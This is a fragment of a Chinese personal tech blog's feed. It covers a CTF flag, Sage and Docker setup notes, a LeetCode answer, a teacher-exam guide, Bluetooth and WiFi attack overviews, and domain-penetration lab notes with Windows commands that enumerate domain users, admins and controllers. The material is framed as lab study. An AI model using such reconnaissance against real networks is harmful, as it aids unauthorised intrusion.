src="/2021/09/27/DASCTF9%E6%9C%88%E8%B5%9BX%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/image-20210928180429201.png" alt></p><p>这波re属实简单</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Y0U_ar3_The_k1ng_0f_pig_bra1n!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在pycharm中配置sage</title>
      <link href="2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/"/>
      <url>2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/</url>
      
        <content type="html"><![CDATA[<h2 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h2><h3 id="1-下载sage"><a href="#1-下载sage" class="headerlink" title="1.下载sage"></a>1.下载sage</h3><p>到<a href="https://mirrors.tuna.tsinghua.edu.cn/sagemath/win/index.html">官网</a>下载sage的下载器，我下载的是8.3版本的不带installer的那个。然后正常的安装步骤，先将sage的这个环境整好。</p><h3 id="2-配置环境变量"><a href="#2-配置环境变量" class="headerlink" title="2.配置环境变量"></a>2.配置环境变量</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">setx Path &quot;%Path%;C:\Program Files\SageMath 8.3\runtime\opt\sagemath-8.3\local\lib;C:\Program Files\SageMath 8.3\runtime\opt\sagemath-8.3\local\bin;C:\Program Files\SageMath 8.3\runtime\bin;C:\Program Files\SageMath 8.3\runtime\lib\lapack&quot;setx SAGE_ROOT &#x2F;opt&#x2F;sagemath-8.3setx SAGE_LOCAL &#x2F;opt&#x2F;sagemath-8.3&#x2F;localsetx DOT_SAGE &#x2F;dot_sage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>sage在pycharm里面流畅运行的最低保障。</p><h3 id="3-配置pycharm"><a href="#3-配置pycharm" class="headerlink" title="3.配置pycharm"></a>3.配置pycharm</h3><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/image-20210811213453135.png" alt></p><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/image-20210811213541048.png" alt></p><p>这样环境就好了，可以直接<code>from sage import *</code>了哈哈。</p><p><img src="/2021/08/11/%E5%9C%A8pycharm%E4%B8%AD%E9%85%8D%E7%BD%AEsage/image-20210811215823812.png" alt></p><p>但是3.6似乎没有预装甚么东西之类的，<strong>注意这里只能用python2.7</strong>。而后<code>frome sage.all import *</code>就可以正常使用了，但是pycharm还是会识别出错，不管他就行了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pyharm </tag>
            
            <tag> sage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode刷题python3版</title>
      <link href="2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88/"/>
      <url>2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><img src="/2021/08/07/leetcode%E5%88%B7%E9%A2%98python3%E7%89%88/image-20210807142846750.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">twoSum</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> target<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>target <span class="token keyword">and</span> i <span class="token operator">!=</span> j<span class="token punctuation">:</span>                    <span class="token keyword">return</span> <span class="token punctuation">[</span>i<span class="token punctuation">,</span> j<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h3>]]></content>
      
      
      
        <tags>
            
            <tag> python， 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教师资格证考试总结</title>
      <link href="2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是教师资格证考试"><a href="#什么是教师资格证考试" class="headerlink" title="什么是教师资格证考试"></a>什么是教师资格证考试</h2><p><a href="https://baike.baidu.com/item/教师资格证/3287811">教师资格证</a>考试，是由<a href="https://baike.baidu.com/item/教育部考试中心/5104094">教育部考试中心</a>官方设定的<a href="https://baike.baidu.com/item/教师资格考试/4063442">教师资格考试</a>。</p><p>2012年之前，教师资格考试是由各省自行组织命题和考试。主要针对<a href="https://baike.baidu.com/item/非师范专业/15529578">非师范专业</a>需要考取教师资格证的考生。（<strong>师范专业学校直接颁发教师资格证</strong>）</p><p>2012年后，教师资格考试纳入统考试点和省考相结合的模式。到2018年除了新疆，内蒙古，西藏三个地区外<strong>其他省份全部纳入了教师资格统考</strong>，由教育部考试中心出题，地方教育考试院主考。主要<strong>针对师范专业和非师范专业需要考取教师资格证的考生</strong>。</p><h2 id="报考条件"><a href="#报考条件" class="headerlink" title="报考条件"></a>报考条件</h2><p>符合以下基本条件的人员，可以报名参加教师资格考试：</p><p>1．具有中华人民共和国国籍；</p><p>2．遵守宪法和法律，热爱教育事业，具有良好的思想品德；</p><p>3．符合申请认定教师资格的体检标准；</p><p>4．符合《教师法》规定的学历要求。</p><p>（一）幼儿园教师资格，应当具备幼儿师范学校毕业及以上学历。</p><p>（二）小学教师资格，应当具备<a href="https://baike.baidu.com/item/中等师范学校/4909468">中等师范学校</a>毕业及以上学历。</p><p>（三）初中教师资格，应当具备高等<a href="https://baike.baidu.com/item/师范专科学校/7881407">师范专科学校</a>或者其他大学专科毕业及以上学历。</p><p>（四）高级中学和<a href="https://baike.baidu.com/item/中等职业学校/7487709">中等职业学校</a>教师资格，应当具备高等师范院校本科或者大学本科毕业及以上学历。</p><p>（五）中等职业学校实习指导教师资格，应当具备中等职业学校毕业及以上学历，并应当具有相当助理工程师以上<a href="https://baike.baidu.com/item/专业技术职务/6597015">专业技术职务</a>或中级以上工人技术等级。</p><p><strong>考生应在户籍(开封)、学籍(在哪上的大学就在哪考试)或人事关系(在哪工作就在哪考试)所在市州报名</strong>参加中小学教师资格考试。<strong>普通高等学校毕业及其毕业前一年级学生(就是说大三大四的可以参加报考)</strong>，以及在校<a href="https://baike.baidu.com/item/全日制研究生/10588952">全日制研究生</a>，可凭学校学籍管理部门出具的在籍学习证明报考，在就读学校所在地报名参加中小学教师资格考试。</p><p>被撤销教师资格的，5年内不得报名参加考试；受到剥夺政治权利，或故意犯罪受到有期徒刑以上刑事处罚的，不得报名参加考试。曾参加教师资格考试有作弊行为的，按照《<a href="https://baike.baidu.com/item/国家教育考试违规处理办法/6994647">国家教育考试违规处理办法</a>》(教育部令第33号，下同)的相关规定执行。</p><h2 id="统考地区"><a href="#统考地区" class="headerlink" title="统考地区"></a>统考地区</h2><p>北京、天津、河北、山西、辽宁、吉林、黑龙江、上海、江苏、浙江、安徽、福建、江西、山东、<strong>河南</strong>、湖南、湖北、广东、广西、海南、重庆、四川、贵州、云南、陕西、甘肃、宁夏、青海</p><p>本篇文章为针对统考地区的考试前的总结。</p><p>统考地区目前的考试内容如下：</p><blockquote><p>幼儿园：综合素质+保教知识与能力</p><p>小学：综合素质+教育教学知识与能力</p><p><strong>中学：综合素质+教育知识与能力+学科知识与能力</strong></p></blockquote><h2 id="关于考核的身体条件"><a href="#关于考核的身体条件" class="headerlink" title="关于考核的身体条件"></a>关于考核的身体条件</h2><p>“身体条件”应为教育教学能力的一部分，或者说是承担教育教学任务的“硬件”，因为教师(特别是小学和幼儿园教师)身体条件对教育教学效果有一定影响。《教师资格条例》第六条规定：“有教育教学能力应当包括符合国家规定的从事教育教学工作的身体条件。”教师身体条件主要是<strong>要求无传染性疾病，无精神病史，有完全的法律行为能力</strong>等。“身体条件”的具体标准参照师范教育类专业招生体检标准的有关规定执行。</p><h2 id="考试流程"><a href="#考试流程" class="headerlink" title="考试流程"></a>考试流程</h2><ol><li>考普通话证（语文老师要二级甲等以上(<strong>87分－91.99分之间</strong>)；其他科目要二级乙等以上(<strong>80分－86.99分之间</strong>） 一般3月到6月，9月到12月每个月可以考一次。</li><li>考心理学以及教育学（该考试半年一次，通常在3月和10月，  有效期要根据自己省份的规定，因此最好一次性通关；在考心理学和教育学时，就要报名好考试的等级——幼儿教师/小学/初中/高中&amp;高职/大学，你的学历一定要高你报名等级一级，如果你要教高中就一定要大专以上学历，另外大学教师证是提供给大学在职教师考的）(<strong>值得一提的是现在统考(国考)已经将这两门学科融入到了‘一次考试’的内容里面了，所以不用特殊报名，直接考笔试就OK了</strong>)</li><li>拿上你的以上三个证外加毕业证、身份证、体检，就可以去报名试讲——也就是“说课”，这个时候你要选好科目（就是要选好数学、语文之类的） 。说课一般是15分钟，考之前上网下一下模板。 在每年6月和11月，通过说课就可以拿证了。</li></ol><h2 id="考试时间安排"><a href="#考试时间安排" class="headerlink" title="考试时间安排"></a>考试时间安排</h2><p><strong>时间安排大致如下</strong></p><div class="table-container"><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>1月14日</td><td>2021上半年笔试报名</td></tr><tr><td>3月3日</td><td>2020下半年面试成绩查询</td></tr><tr><td>3月13日</td><td>2021上半年笔试考试</td></tr><tr><td>4月15日</td><td>2021上半年笔试查询2021上半年面试报名</td></tr><tr><td>5月15-16日</td><td>2021上半年面试考试</td></tr><tr><td>6月12日</td><td>2021上半年面试成绩查询</td></tr><tr><td><strong>时间</strong></td><td><strong>事件</strong></td></tr><tr><td>9月3日</td><td>2021下半年笔试报名</td></tr><tr><td>10月30日</td><td>2021下半年笔试考试</td></tr><tr><td>12月10日</td><td>2021下半年笔试成绩查询2021下半年面试报名</td></tr><tr><td>2022年1月8-9日</td><td>2021下半年面试考试</td></tr><tr><td>1月14日</td><td>2022上半年笔试报名</td></tr><tr><td>3月3日</td><td>2021下半年面试成绩查询</td></tr></tbody></table></div><h3 id="细分时间安排"><a href="#细分时间安排" class="headerlink" title="细分时间安排"></a>细分时间安排</h3><p>笔试 <strong>各科目考试时间为120分钟</strong>。</p><p>面试 <strong>考试时间为20分钟</strong>。</p><h1 id="考试内容总结"><a href="#考试内容总结" class="headerlink" title="考试内容总结"></a>考试内容总结</h1><p><strong>1、教师资格证考试有哪些学段和学科</strong></p><p>教师资格证考试包括<strong>幼儿园、小学、中学，</strong>其中<strong>中学又分为初中、高中及中职，</strong>下边我来挨个说说各学段包含的学科：</p><p>这里只总结高中的相关的学科</p><p><strong>高中：</strong>包括17个学科，分别为语文、数学、英语、物理、化学、生物、思想品德、历史、地理、体育与健康、音乐、美术、信息技术、通用技术、心理健康教育、日语、俄语；</p><p><strong>注意：</strong>我们教师资格证的考试对于考生的专业是不作要求的，比如你是学音乐的，但你照样可以选择报考体育学科。<strong>但是，在这里建议各位考生，尽量还是选一个和你专业相近的科目去报考，因为许多地区在进行教师招聘时，都会要求考生的报考科目与所学专业一致或相近</strong>。</p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-5289f18b3406de812ec7c102c62a946b_r.jpg" alt="教师资格证笔试科目"></p><p><img src="/2021/07/14/%E6%95%99%E5%B8%88%E8%B5%84%E6%A0%BC%E8%AF%81%E8%80%83%E8%AF%95%E6%80%BB%E7%BB%93/v2-44827c601dad868e49eb37e5b33fb34e_720w.jpg" alt="中学除科目三的考试内容"></p><p>关于考试的试题，这里就没什么好总结的了，因为考试的话根据我的经验，<strong>最好的了解与提升方式就是看往年的真题</strong>，明天想办法拿到真题再说吧。</p><p><a href="教师资格证考试总结/2020下半年教师资格考试中学《综合素质》试题_天津中公教育.pdf">《综合素质》真题pdf版，点击下载</a>。想要答案的请加我qq，[ :萌: ] 2994016494。</p><p><a href="https://wenku.baidu.com/view/60fc3ddf4b7302768e9951e79b89680203d86b8c.html">《教育知识与能力》真题链接</a></p><p>个人感觉大部分选择题都是些常识性的题目，这两门是同意都要考得，涵盖的是教育学与心理学相关的知识，需要资料较为统一。</p><p>然后就是<strong>《学科知识与教学能力》了</strong>，如果前面的两门相当于高考时的<strong>语数外</strong>的话，这一门分的就是文综与理综了，考的知识点专精，例如<strong>英语学科与教学能力</strong>的往年的试题如下</p><p><a href="https://www.233.com/teacher/zxzzt/201806/28090801272.html">英语学科往年试题</a></p><p>之后就是个把月之后还有的面试了，面试相关的知识较为简单，那个等对教师资格证的考试体制有了更深一步的了解之后会再去总结，面试的话主要就是备课、上课、面试几大步吧应该。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教师资格证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运维经验贴</title>
      <link href="2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/"/>
      <url>2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos运维经验"><a href="#Centos运维经验" class="headerlink" title="Centos运维经验"></a>Centos运维经验</h1><h2 id="docker相关的经验"><a href="#docker相关的经验" class="headerlink" title="docker相关的经验"></a>docker相关的经验</h2><h3 id="直接对docker的操作"><a href="#直接对docker的操作" class="headerlink" title="直接对docker的操作"></a>直接对docker的操作</h3><h4 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo yum install -y yum-utils  device-mapper-persistent-data  lvm2yum-config-manager --add-repo https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repodnf install https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;7&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.13-3.1.el7.x86_64.rpmdnf install docker-cesudo yum install docker-ce docker-ce-clisudo systemctl start dockerdocker --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl enable docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><blockquote><ul><li><p>docker中国官方</p> <pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;registry.docker-cn.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>网易</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;hub-mirror.c.163.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>USTC</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>阿里云　　</p> <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;你的ID&gt;.mirror.aliyuncs.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></blockquote><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">换源的方法是编辑&#x2F;etc&#x2F;docker&#x2F;daemon.json（如果不存在则创建）:&#123;    &quot;registry-mirrors&quot;:[         &quot;http:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;,         &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,         &quot;http:&#x2F;&#x2F;registry.docker-cn.com&quot;    ] ,    &quot;insecure-registries&quot;:[       &quot;docker.mirrors.ustc.edu.cn&quot;,         &quot;registry.docker-cn.com&quot;    ]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="重启docker"><a href="#重启docker" class="headerlink" title="重启docker"></a>重启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">systemctl start docker   # 一般开启docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="对docker容器的操作"><a href="#对docker容器的操作" class="headerlink" title="对docker容器的操作"></a>对docker容器的操作</h3><h4 id="复制文件到docker容器"><a href="#复制文件到docker容器" class="headerlink" title="复制文件到docker容器"></a>复制文件到docker容器</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo docker cp 源vps绝对路径 容器ID:容器内的目标绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装CTFd"><a href="#安装CTFd" class="headerlink" title="安装CTFd"></a>安装CTFd</h3><pre class="line-numbers language-none"><code class="language-none">sudo docker run --name ctfd -d -p 80:8000 ctfd&#x2F;ctfd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看端口占用进程"><a href="#查看端口占用进程" class="headerlink" title="查看端口占用进程"></a>查看端口占用进程</h3><pre class="line-numbers language-none"><code class="language-none">sudo lsof -i: 端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="常用小工具"><a href="#常用小工具" class="headerlink" title="常用小工具"></a>常用小工具</h1><h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><h3 id="解决hexo环境变量失效的问题"><a href="#解决hexo环境变量失效的问题" class="headerlink" title="解决hexo环境变量失效的问题"></a>解决hexo环境变量失效的问题</h3><p>hexo的环境变量应为</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\Administrator\AppData\Roaming\npm\node_modules\hexo-cli\bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/10/%E8%BF%90%E7%BB%B4%E7%BB%8F%E9%AA%8C%E8%B4%B4/image-20210812223221216.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学总刊</title>
      <link href="2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/13/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h1><h2 id="通过QQ电话实现低精度ip定位"><a href="#通过QQ电话实现低精度ip定位" class="headerlink" title="通过QQ电话实现低精度ip定位"></a>通过QQ电话实现低精度ip定位</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无线安全</title>
      <link href="2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
      <url>2021/06/10/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="蓝牙攻击"><a href="#蓝牙攻击" class="headerlink" title="蓝牙攻击"></a>蓝牙攻击</h1><h2 id="蓝牙是什么"><a href="#蓝牙是什么" class="headerlink" title="蓝牙是什么?"></a>蓝牙是什么?</h2><blockquote><p>在当前的网络应用中，物联网具有对物品多样性、低成本、低速率、短距离等特征的泛在需求，这类需求主要通过蓝牙等低速网络协议实现。蓝牙是一种短距离通信开放标准，利用嵌入式芯片实现通讯距离在10m～100m之间的无线连接。蓝牙的设计目标在于通过统一的近距离无线连接标准使各生产商生产的个人设备都能通过该网络协议更方便地实现低速率数据传输和交叉操作。蓝牙技术具有低成本、低功耗、模块体积小、易于集成等特点，非常适合在新型物联网移动设备中应用。</p></blockquote><h2 id="几种攻击方式"><a href="#几种攻击方式" class="headerlink" title="几种攻击方式"></a>几种攻击方式</h2><p>引用自此、<a href="https://www.chomptech.com/3843.html">https://www.chomptech.com/3843.html</a></p><blockquote><p><strong>针对蓝牙的攻击威胁大体上可以分为两种，一种是对不同无线网络均适用的攻击，—种是针对蓝牙特定的攻击。</strong></p><p>3.1拒绝服务攻击：拒绝服务攻击(DOS)的原理是在短时间内连续向被攻击目标发送连接请求，使被攻击目标无法与其他设备正常建立连接。蓝牙的逻辑链路控制和适配协议规定了蓝牙设备的更高层协议可以接收和发送64KB的数据包，类似于ping数据包，针对这个特点，攻击者可以发送大量ping数据包占用蓝牙接口，使蓝牙接口不能正常使用，并目一直使蓝牙处于高频工作状态从而耗尽设备电池。DoS攻击流程图如图4所示。</p><p>3.2中间人攻击：在两个设备之间的攻击者截获数据一方发送的数据后再转发给另一方，可在不影响双方通信的情况下获得双方通信的内容，是一种广泛应用于无线网络的攻击方式。蓝牙4.0版本的低功耗蓝牙技术(BluetoothLowEnergy，BLE)在设计初始时有防范中间人攻击的安全措施，但是在产品阶段考虑到产品功耗成本等因素，这方面并没有得到足够的重视，依然容易受到攻击。最常见的是用软硬件结合的蓝牙攻击设备伪造BLE通信进行中间人攻击。中间人攻击示意图如图5所示。</p><p>3.3漏洞窃听：蓝牙窃听可以通过对蓝牙漏洞的攻击来实现，蓝牙中的OBEX(ObjectExchange)协议，即对象交换协议在早期的蓝牙产品规范中没有强制要求使用权鉴，所以攻击者可以利用此漏洞在被攻击者手机没有提示的情况下链接到被攻击手机，获取对手机内各种多媒体文件以及短信通话记录等文件的增删改权限，甚至可以通过手机命令拨打接听电话。具有这些攻击功能的指令代码被黑客写成了手机软件，可在网络上下载。普通人_般会使用图形化界面去操作，某些山寨手机中甚至自带这项功能，当和别的手机配对成功后即可获得对方手机的操作权限。不过随着蓝牙技术的不断提升，针对早期蓝牙漏洞的攻击现在已经越来越少见。</p><p>3.4重放攻击：重放攻击的原理是监听或者伪造双方通信的认证凭证，经过处理后再回发给被攻击方进行认证。蓝牙传输过程中有79个信道，攻击者可以通过监听信道、计算跳频时序、回放已授权设备的IZI令来进行攻击。V4.2的标准中已经增加了防止重放攻击的协议。</p><p>3.5配对窃听：蓝牙V2.0及之前更早版本默认的4位PIN码很容易被暴力破解，因为低位数字排列组合的方式十分有限，蓝牙V4.0的LE配对同理。攻击者只要监听到足够的数据帧，就可以通过暴力破解等方式确定密钥，模拟通信方，实现攻击目的。</p><p>3.6位置攻击：每个蓝牙设备都有唯一的6字节序列号作为设备地址，这种序列标识由于在使用过程中不发生改变很容易泄露设备的位置信息。攻击者可以根据蓝牙的调频连接机制和寻呼机制、设备标识符和其他通信参数获得被攻击者设备的地理位置。</p><p>3.7简单配对模式攻击：蓝牙V2.0规定的SSP安全简单配对连接方式并不安全，是由于使用了静态口令而无法防止中间人攻击，并且一旦攻击者取得了口令，在一段时间内可以用此口令进行持续性攻击。</p></blockquote><p>暂时因为linux虚拟机的问题解决不了而放弃。。。</p><h1 id="WIFI攻击"><a href="#WIFI攻击" class="headerlink" title="WIFI攻击"></a>WIFI攻击</h1><h2 id="什么是WIFI"><a href="#什么是WIFI" class="headerlink" title="什么是WIFI"></a>什么是WIFI</h2><blockquote><p>​    无线网络上网可以简单的理解为无线上网，几乎所有<a href="https://baike.baidu.com/item/智能手机">智能手机</a>、<a href="https://baike.baidu.com/item/平板电脑">平板电脑</a>和笔记本电脑都支持Wi-Fi上网，是当今使用最广的一种无线网络传输技术。实际上就是把有线网络信号转换成无线信号，就如在开头为大家介绍的一样，使用无线路由器供支持其技术的相关电脑，<a href="https://baike.baidu.com/item/手机/6342">手机</a>，平板等接收。手机如果有Wi-Fi功能的话，在有Wi-Fi无线信号的时候就可以不通过移动联通的网络上网，省掉了流量费。</p><p>​    无线网络无线上网在大城市比较常用，虽然由Wi-Fi技术传输的无线通信质量不是很好，数据安全性能比蓝牙差一些，传输质量也有待改进，但传输速度非常快，可以达到54Mbps，符合个人和社会信息化的需求。Wi-Fi最主要的优势在于不需要布线，可以不受布线条件的限制，因此非常适合移动办公用户的需要，并且由于发射信号功率低于100mw，低于手机发射功率，所以Wi-Fi上网相对也是最安全健康的。</p><p>​    但是Wi-Fi信号也是由有线网提供的，比如家里的<a href="https://baike.baidu.com/item/ADSL">ADSL</a>，小区宽带等，只要接一个<a href="https://baike.baidu.com/item/无线路由器">无线路由器</a>，就可以把有线信号转换成Wi-Fi信号。国外很多发达国家城市里到处覆盖着由政府或大公司提供的Wi-Fi信号供居民使用，我国也有许多地方实施”<a href="https://baike.baidu.com/item/无线城市">无线城市</a>“工程使这项技术得到推广。在4G牌照没有发放的试点城市，许多地方使用4G转Wi-Fi让市民试用。(现在已经5G了，也就是说百度百科的某些信息都已经过时了)</p></blockquote><h2 id="ESP8266实现WIFI-Killer"><a href="#ESP8266实现WIFI-Killer" class="headerlink" title="ESP8266实现WIFI Killer"></a>ESP8266实现WIFI Killer</h2><p>​    在4G wifi网的情况下，我们是可以使用自制的开发板来实现无线wifi攻击的，这里我特意上某多买了一个esp 8266开发板，emmm，具体型号应该是叫<code>NodeMCU</code></p><p>​    看看下面的<a href="https://wiki.diustou.com/cn/NodeMCU">百科</a>，大概了解一下esp8266开发板</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WEB靶场复现总刊</title>
      <link href="2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="域渗透的基础知识"><a href="#域渗透的基础知识" class="headerlink" title="域渗透的基础知识"></a>域渗透的基础知识</h2><p><a href="https://www.freebuf.com/company-information/172630.html">干货！内网渗透测试之域渗透详解！收藏！</a></p><p><a href="http://www.91ri.org/10154.html">内网渗透之-域渗透基础</a></p><p>希望今天可以简单学习一下域渗透的基础知识，为明天的域渗透实战做好准备    ——2021年6月4日</p><h3 id="域渗透场景"><a href="#域渗透场景" class="headerlink" title="域渗透场景"></a>域渗透场景</h3><p>场景一：某处于域中的服务器通过路由做端口映射，对外提供web服务，我们通过web脚本漏洞获得了该主机的system权限，如果甲方有进一步的内网渗透测试需求，以证明企业所面临的巨大风险，这个时候就需要做内网的域渗透。</p><p>……</p><p>域渗透看起来就像是所获成果的效益最大化，拿到system权限之后，再用该拿到权限的主机作为跳板打通内网</p><h3 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h3><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p><p><strong>&lt;域控制器、域成员、web服务器&gt;</strong></p><p>域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p><h3 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain        #查看时间服务器net user &#x2F;domain        #查看域用户net view &#x2F;domain        #查看有几个域net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员net group &quot;domain controllers&quot; &#x2F;domain       #查看域控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红日安全靶场"><a href="#红日安全靶场" class="headerlink" title="红日安全靶场"></a>红日安全靶场<01 att&ck红队评估></01></h2><h3 id="零、靶场介绍与下载"><a href="#零、靶场介绍与下载" class="headerlink" 